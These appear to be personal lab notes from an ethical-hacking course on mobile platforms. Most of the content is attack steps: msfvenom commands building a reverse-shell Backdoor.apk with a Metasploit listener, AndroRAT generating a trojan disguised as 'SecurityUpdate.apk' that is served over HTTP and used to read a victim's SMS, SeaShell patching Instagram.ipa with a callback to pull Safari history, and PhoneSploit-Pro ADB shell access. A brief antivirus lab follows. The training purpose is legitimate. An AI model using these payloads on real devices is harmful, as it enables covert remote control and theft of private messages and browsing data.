

2025-08-18 23:12

Status:

Tags:

# Hacking Mobile Platforms

## Hacking Android OS

#### Exploiting Android Devices Using Metasploit 
1.  Run the following commands to view Android exploits and Android payloads for hacking an Android device
	- `` search type:exploit platform:android o msf`` 
	- ``search type:payload platform:android``
2. command to build a custom payload:
	- ``msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Local Host IP Address> R > Desktop/Backdoor.apk
3.  Open listener 
	- ``use exploit/multi/handler`` 
	- ``set PAYLOAD android/meterpreter/reverse_tcp  ``

### Android Hacking Tools
some of the tools that are used in Android hacking are 
- AndroRAT 
-  Ghost Framework 

### Android-based Sniffers 
-  PCAPdroid
### Android Device Tracking Tools
- Google Find My Device 
-  Find My Phone 
-  Prey: Find My Phone & Security (https://play.google.com) 
- Phone Tracker and GPS Location (https://play.google.com) 
- Mobile Tracker for Android (https://play.google.com) 
- Lost Phone Tracker (https://play.google.com) 
- Phone Tracker By Number (https://play.google.com)

### Android Vulnerability Scanners 
-  Quixxi App Shield 
-  Android Exploits (https://play.google.com) 
- ImmuniWeb® MobileSuite (https://www.immuniweb.com) 
- Yaazhini (https://www.vegabird.com) 
- Vulners Scanner (https://play.google.com)

### Static Analysis of Android APK Using Mobile Security Framework (MobSF)
Security analysts can use the Mobile Security Framework (MobSF) tool to perform static and dynamic analyses of suspected Android APK files. 
 go to the https://mobsf.live/ website, and upload the suspicious APK file by clicking on the Upload & Analyze button to start static analysis.

### Oline Android Analyzers 
Online Android analyzers allow you to scan APKs and perform security analysis to detect vulnerabilities in the applications. 
▪ Sixo Online APK Analyzer 
## Hacking iOS
### Jailbreaking iOS Using Hexxa Plus 
Steps to Install Hexxa Plus 
-  Step 1: Go to Xookz App Store → click on Hexxa (Full)
-  Step 2: In the upper right corner, click the Install button to receive the configuration profile on the iPhone device. Note: If a pop-up is displayed while installing, tap on Allow
-  Step 3: Now, navigate to Settings → click the profile downloaded from the above step → click on Install button.
-  Step 4: Enter screen password → click Install again
-  Step 5: The Hexxa Plus Repo Extractor icon appears on the homescreen. 
- Step 6: Open the Hexxa Plus Repo Extractor → click on Get Repos 
-  Step 7: Choose a desired jailbreaker’s repo → copy its URL from the given categories. 
- Step 8: Click on the Extract Repo option → paste the copied URL
-  Step 9: Extract the jailbreaker’s repo by clicking the OK button
### Jailbreaking Tools 
- Redensa 
-  checkra1n (https://checkra.in) 
- palera1n (https://palera.in) 
- Zeon (https://zeon-app.com) 
- Sileo (https://en.sileem.com) 
- Cydia (https://www.cydiafree.com)


- Hacking using Spyzie
### Post-exploitation on iOS Devices Using SeaShell Framework
- SeaShell Framework 
- SeaShell is an iOS post-exploitation framework that enables attackers to remotely access, control, and extract sensitive information from compromised devices. Attackers can use this exploitation framework to exploit the CoreTrust vulnerability, which allows bypassing security checks of CoreTrust for unauthorized software execution. 
-  Step 1: Run the following command to launch the SeaShell Framework: seashell
- Step 2: Run the following command to patch an IPA file and provide the IP address and port number to establish a connection: ipa patch Instagram.ipa
- Step 3: Now, run the following command to start a listener on the host and port added to the patched IPA: listener on ``<IP address> <Port no>``
- You will receive a connection after the installed application opens.
- Step 4: Run the following commands to interact with the compromised device using the interactive shell by implementing Pwny: ``devices -i <id>``
You can also run the “help“ command to generate a list of available commands. 
- Step 5: Once the remote interaction is successfully established, execute the following command to access the web browsing history: safari_history
Note: The command retrieves and parses the database, which is located at ”/var/mobile/Library/Safari/”




### OS Hacking Tools 
Various tools used by attackers to hack target iOS mobile devices are discussed below: 
-  Elcomsoft Phone Breaker 
-  Enzyme (https://github.com) 
- Network Analyzer: net tools (https://apps.apple.com) 
- iOS Binary Security Analyzer (https://github.com) 
- iWepPRO (https://apps.apple.com) 
- Frida (https://frida.re)

# Lab 1: Hack Android Devices

## Task 1: Exploit the Android Platform through ADB using PhoneSploit-Pro
- open parrot as sudo 
	 - command 
		 - ``cd PhoneSploit-Pro``
1. open tool   phonesploitpro
	- command 
		- ``python3 phonesploitpro.py`
	- Do you still want to continue to PhoneSploit Pro? = y
2.   to connect a device Type 1 and press Enter to select 1. Connect a Device
	- type: ``<ipad target>``
3. type ``6`` and press **Enter** to choose **Get Screenshot**.
	- **Do you want to Open the file?**, type ``Y``
4. to view List Installed Apps
	- type 13 and press **Enter** to choose **List Installed Apps**. and press **Enter** to choose **List Installed Apps**.
	-   Type ``2`` and press **Enter** to **List all packages**.
5. type **10** and press **Enter** to choose **Run an app**
	-  Type **2** and press **Enter** to **Enter Package Name Manually**
	-   To launch the calculator app, type **com.android.calculator2** and press **Enter**.
6. to  **Access Device Shell**.
	- type **14** and press **Enter** to choose **Access Device Shell**.
	- ``pwd``
	- ``cd sdcard``
	- ``cd Download``
	- Note down the location of images.jpeg
		- /sdcard/Download/images.jpeg
7. Open a Link on Device
	- type **23** and press **Enter** to choose Open a Link on Device
	-  **Enter URL**, type the desired URL (in this case,``https://pranx.com/hacker/`` and press Enter
	- switch to Android
	-  **Open with** pop-up appears **Click on Chrome | Just Once**. If **We value your privacy** popup appears, click on **AGREE**.
8. open parrot -> **Get Device Information** option.
	-  type **27** and press **Enter** to choose the **Get Device Information** option.
- end 
- to get call log info 
- first get connect to decivce through PhoneSploit-Pro and select 15 option which will hack using Metasploit and then use ``dum_calllog`` 
  - for next page ``N``
## Task 2: Hack an Android Device by Creating APK File using AndroRAT
- open parrot as sudo 
	- ``cd AndroRAT``
1. generating APK file using  androRAT
	- ``python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk``
2. command to copy the **SecurityUpdate.apk** file to the location **share** folder.
	- ``cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/``
	- If the share folder does not exist, then execute the following
		- Run ``mkdir /var/www/html/share`` command to create a shared folder
		- Run ``chmod -R 755 /var/www/html/share`` command
		- Run ``chown -R www-data:www-data /var/www/html/share`` command
			- or 
	- `` python3 -m http.server
3.  command to start listening to the victim's machine.
	- ``python3 androRAT.py --shell -i 0.0.0.0 -p 4444``
4. open android machine 
	- open any browser and go link 
	- ``htttp://10.10.1.13:8000
	- download and allow 
5. open parrot
	- and check and type 
	- ``help ``
	- to view the device related information.
		- ``deviceInfo 
	- to obtain a file containing SMSes from the inbox of a victim device.
		- ``getSMS inbox``
	- to view the MAC address of the victim's device.
		- ``getMACAddress``
	- to view other command type ``help ``
- done
- some important points to rember
- 
# Lab 2: Secure Android Devices using Various Android Security Tools
## Task 1: Secure Android Devices from Malicious Apps using AVG
- open Android machine 
1. open  **AVG AntiVirus** app
2. do smart scan 
	- give all permissions 
3.  **REMOVE** under Malware Detected section to remove the respective malware.
- done 

### References

### shortcut key 
- command to create a shared folder 
	 -  ``mkdir /var/www/html/share``
	 - ``chmod -R 755 /var/www/html/share``
	 - ``chown -R www-data:www-data /var/www/html/share``
 - command to start an Apache web server.
	 - ``service apache2 start``
- to download it from 
	- ``http://10.10.1.13/share``